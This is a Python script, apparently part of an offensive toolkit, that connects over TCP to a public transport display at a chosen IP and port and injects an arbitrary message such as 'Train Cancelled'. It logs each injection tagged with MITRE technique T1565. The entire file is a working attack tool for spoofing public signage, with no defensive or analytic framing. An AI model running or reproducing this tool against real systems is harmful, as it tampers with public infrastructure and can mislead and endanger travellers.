#!/usr/bin/env python3
# modules/attacks/public_transport_display_spoofer.py

import socket
import argparse
import json
import os
from datetime import datetime

LOG_FILE = "results/transport_display_spoof_log.json"
MITRE_TTP = "T1565"

def log_event(ip, route_msg):
    os.makedirs("results", exist_ok=True)
    log = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": ip,
        "message": route_msg,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(log) + "\n")

def spoof_display(ip, port, msg):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.sendall(f"{msg}\n".encode())
        s.close()
        log_event(ip, msg)
        print(f"[✓] Spoofed message sent to transport display: {msg}")
    except Exception as e:
        print(f"[!] Injection failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spoof public transport signage via TCP injection")
    parser.add_argument("--ip", required=True, help="Target IP")
    parser.add_argument("--port", type=int, default=2323, help="Target TCP port")
    parser.add_argument("--msg", required=True, help="Message to inject (e.g. 'Train Cancelled')")
    args = parser.parse_args()

    spoof_display(args.ip, args.port, args.msg)
